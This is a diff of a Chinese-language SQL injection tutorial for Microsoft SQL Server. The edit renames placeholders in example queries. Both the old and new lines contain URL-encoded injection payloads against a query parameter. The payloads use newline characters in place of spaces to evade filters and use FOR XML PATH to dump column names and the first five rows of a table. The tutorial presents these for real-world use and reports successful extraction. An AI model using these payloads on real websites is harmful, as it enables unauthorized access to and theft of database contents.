@@ -152,7 +152,7 @@ xxx.com?abc=a%27%0aand%0a1=(SELECT%0aname%2b%27,%27%0aFROM(SELECT%0aname%0afrom%
 
 注字段名的语句，table指的是注出来的表名
 ```html
-select name+',' from (SELECT Name FROM SysColumns WHERE id=Object_Id('table_name'))a FOR XML PATH('')
+select name+',' from (SELECT Name FROM SysColumns WHERE id=Object_Id('table'))a FOR XML PATH('')
 ```
 那么运用到实战:
 ```html
@@ -162,11 +162,11 @@ xxx.com?abc=a%27%0aand%0a1=(select%0aname%2b%27,%27%0afrom%0a(SELECT%0aName%0aFR
 
 接着注字段的值
 ```html
-SELECT column_name+',' FROM(SELECT column_name from 数据库名.dbo.table_name)a FOR  XML PATH('')
+SELECT column_name+',' FROM(SELECT column from 数据库名.dbo.table_name)a FOR  XML PATH('')
 ```
-这里column_name指的是字段名,table_name指的是表名，如果不指定数据库名就会查当前数据库
+这里column指的是字段名,table指的是表名，如果不指定数据库名就会查当前数据库
 运用到实战
 ```html
-xxx.com?abc=a%27%0aand%0a1=(SELECT%0atop%0a5%0acolumn_name%2b%27,%27%0aFROM(SELECT%0acolumn_name%0afrom%0adbo.table_name)a%0aFOR%0a%0aXML%0aPATH(%27%27))%0aand%0a%271%27=%271
+xxx.com?abc=a%27%0aand%0a1=(SELECT%0atop%0a5%0acolumn%2b%27,%27%0aFROM(SELECT%0acolumn%0afrom%0adbo.table)a%0aFOR%0a%0aXML%0aPATH(%27%27))%0aand%0a%271%27=%271
 ```
 成功注出前五条数据
